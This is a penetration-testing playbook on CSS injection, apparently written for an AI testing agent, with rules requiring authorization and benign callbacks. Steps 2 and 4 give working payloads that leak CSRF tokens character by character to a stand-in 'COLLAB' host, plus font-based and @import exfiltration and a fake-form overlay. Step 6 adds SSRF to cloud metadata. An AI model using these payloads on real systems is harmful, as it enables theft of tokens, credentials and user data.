# CSS Injection

## Scope and preconditions

Applies to any endpoint where attacker-controlled input is reflected inside a
`<style>` block, a `style` attribute, a CSS custom property, or a stylesheet URL.
Common injection points: theme/color pickers, profile fields rendered in
stylesheets, markdown renderers, email template builders, PDF generators, and any
endpoint that concatenates user input into CSS without sanitization.

CSS injection is **not** XSS — it does not execute JavaScript. Its power is data
exfiltration and UI manipulation in contexts where CSP blocks all script
execution. When `script-src` is strict but `style-src 'unsafe-inline'` is
allowed, CSS injection is the primary remaining attack vector.

It does **not** cover: script-based XSS (use `xss`), HTML injection that does not
involve stylesheets (use `html-injection`), or clickjacking via framing (use
`clickjacking`).

## Rules of engagement

- MUST have written authorization before testing.
- MUST use a benign callback domain (OOB/Interactsh) for exfiltration probes.
  NEVER exfiltrate real user data — demonstrate with your own test values.
- NEVER inject CSS that permanently breaks the application layout for other users.
  Use session-scoped or user-scoped injection points.
- MUST record both the injection request and the exfiltration callback as evidence.

## Workflow

- [ ] 1. Find the injection point — where does user input land in CSS?
- [ ] 2. Confirm CSS interpretation — does injected CSS actually render?
- [ ] 3. Identify what is on the page worth stealing
- [ ] 4. Build the exfiltration payload
- [ ] 5. Verify exfiltration via OOB callback
- [ ] 6. Assess impact and chain potential
- [ ] 7. Record the finding

## Step 1: Find the injection point

### Goal
Identify where attacker-controlled input is rendered inside CSS context.

### Actions
Search captured traffic with `search_responses` for patterns:
- User input reflected between `<style>` tags
- User input in `style="..."` attributes
- User input in CSS custom properties (`--user-color: VALUE`)
- Theme/color/font settings that appear in rendered CSS
- Profile fields (display name, bio, signature) rendered in stylesheets
- Markdown or rich-text renderers that allow CSS

### What to look for
- Direct reflection without encoding: `color: USER_INPUT;`
- Partial encoding that misses CSS-significant characters: `}`, `{`, `:`, `;`, `url()`
- Template engines that HTML-encode but not CSS-encode

### Stop condition
You can point to a specific location in the response where your input appears
inside a CSS context.

## Step 2: Confirm CSS interpretation

### Goal
Prove the browser actually interprets your injected CSS.

### Actions
Inject a visually observable change:
```
red; } body { background: rgb(255,0,0) !important; } .x {color:
```
If the page background turns red, the injection is live.

For `style` attribute injection:
```
; background-color: rgb(255,0,0) !important;
```

Use `send_request` to inject and verify the response contains your CSS unescaped.

### Decision
- **CSS renders** — continue to step 3.
- **CSS is escaped or stripped** — try alternate injection: close the current
  rule with `}`, start a new one, or use CSS comments `/* */` to escape context.
- **No rendering at all** — the input is not in CSS context. Reassess.

## Step 3: Identify exfiltration targets

### Goal
Determine what sensitive data exists on the page that CSS can reach.

### What CSS can read
CSS attribute selectors can match any HTML attribute value character by character:

| Target | Selector pattern |
|---|---|
| CSRF token in hidden input | `input[name="csrf"][value^="a"]` |
| API key in hidden field | `input[type="hidden"][value^="a"]` |
| User data in `data-*` attributes | `[data-email^="a"]` |
| Link targets | `a[href^="https://internal"]` |
| Form actions | `form[action^="/admin"]` |

CSS **cannot** read: text content (only attributes), HttpOnly cookies directly,
or cross-origin resources (same-origin only).

## Step 4: Build the exfiltration payload

### Attribute selector exfiltration (character by character)

The core technique: for each possible character at each position, generate a
CSS rule that triggers a callback if the character matches:

```css
input[name="csrf"][value^="a"] { background: url(https://COLLAB/leak?v=a); }
input[name="csrf"][value^="b"] { background: url(https://COLLAB/leak?v=b); }
...
input[name="csrf"][value^="z"] { background: url(https://COLLAB/leak?v=z); }
```

When the browser matches `value^="a"`, it fetches the URL — the callback tells
you the first character. Repeat for each position: `value^="a..."`.

Use `run_intruder_attack` to generate all character probes efficiently.

### Font-based exfiltration (unicode-range)

For text content that attribute selectors cannot reach, use custom fonts with
`unicode-range` to detect specific characters:

```css
@font-face {
  font-family: leak;
  src: url(https://COLLAB/leak?char=A);
  unicode-range: U+0041;
}
* { font-family: leak, sans-serif; }
```

The browser requests the font only if character U+0041 ('A') appears on the page.
This reveals which characters are present but not their position or order.

### @import timing (cross-origin data leaking)

```css
@import url(https://COLLAB/stage1);
```

The callback server at stage1 returns CSS with the next exfiltration step,
creating a multi-round exfiltration channel. Each round narrows down the target
value one character at a time. This is slower but works for dynamically generated
pages where the full payload cannot be injected at once.

### Opacity/position UI manipulation

```css
.real-form { opacity: 0; position: absolute; z-index: 1; }
.attacker-form { opacity: 1; position: absolute; z-index: 2; }
```

Overlay a fake form on top of the real one. User sees the attacker's form,
submits credentials to attacker endpoint. This is CSS-only clickjacking.

## Step 5: Verify exfiltration

### Goal
Confirm that exfiltrated data arrives at your callback.

### Actions
1. Set up an Interactsh or OOB listener with `get_oob_url`.
2. Inject the exfiltration CSS for the first character position.
3. Visit the page (or have it rendered — email, PDF, etc.).
4. Check for callbacks — each callback URL reveals one character.
5. Iterate position by position until the full value is extracted.

### Stop condition
You have the full exfiltrated value and can demonstrate it matches the real
value on the page.

## Step 6: Assess impact and chaining

### Chain opportunities

| CSS injection + | Result |
|---|---|
| CSRF token exfiltration | Full CSRF bypass → any state-changing action |
| No HttpOnly flag | Session cookie theft via `url()` in computed style |
| PDF generator (wkhtmltopdf, Puppeteer) | SSRF via `url(http://169.254.169.254/)` in CSS |
| Email template (HTML email) | Phishing via layout manipulation, tracking via `url()` |
| Stored injection (profile, comments) | Persistent exfiltration from every visitor |
| CSP `style-src 'unsafe-inline'` | Only attack vector when script-src is strict |

### Impact ladder

| Scenario | Severity |
|---|---|
| Reflected CSS, no sensitive attributes on page | Low |
| Stored CSS injection, leaks CSRF tokens | High |
| CSS injection in PDF gen → SSRF to cloud metadata | Critical |
| CSS injection exfiltrates admin session data | Critical |

## Step 7: Record the finding

Use `add_pentest_finding` with:
- The injection request showing CSS payload
- The OOB callback proving exfiltration
- The exfiltrated value (redacted if sensitive)
- The CSP headers showing `style-src` allows inline

## Known false positives

- CSS that renders but has no sensitive data on the same page to exfiltrate — this
  is still a finding (UI manipulation) but not data theft.
- `url()` in CSS that hits your callback but only because the page has a generic
  image loader, not because your CSS was interpreted.
- PDF generators that sanitize `url()` in CSS — the injection exists but the
  exfiltration path is blocked. Report the injection, note the limitation.

## Reminder

CSS injection is subtle and often overlooked because it does not execute
JavaScript. Its value is highest when CSP blocks XSS entirely — CSS becomes the
only remaining client-side attack vector. Always check `style-src` in the CSP
header. If it allows `'unsafe-inline'` or has no CSP at all, CSS injection is
live. The three things that make a CSS injection finding: **you injected into CSS
context**, **something sensitive is reachable**, and **you can demonstrate
exfiltration or UI manipulation**.
